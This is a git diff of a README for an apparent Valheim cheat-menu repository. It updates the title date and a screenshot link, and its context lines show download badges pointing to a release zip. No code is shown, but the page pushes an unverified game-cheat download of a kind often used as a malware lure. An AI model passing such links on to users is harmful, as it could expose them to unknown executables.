@@ -1,4 +1,4 @@
-# Valheim Mod v1 (Cheat menu) 20-Sep-2026
+# Valheim Mod v1 (Cheat menu) 26-Sep-2026
 
 [![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/StoneViceAdapt/Valheim-Hack-v1/releases/download/v1/Valheim_v1.3.zip)
 [![GitHub release](https://img.shields.io/badge/Release-1.3-blue?style=for-the-badge)](https://github.com/StoneViceAdapt/Valheim-Hack-v1/releases/download/v1/Valheim_v1.3.zip)
@@ -13,7 +13,7 @@ Check out the Features list
 
 ## Features
 
-![Valheim Hacks Menu](https://github.com/StoneViceAdapt/Valheim-Hack-v1/blob/main/assets/image.jpg)
+![Valheim Hacks Menu](https://github.com/StoneViceAdapt/Valheim-Hack-v1/blob/main/assets/image1.jpg?raw=true)
 
 ### Player Mods
 
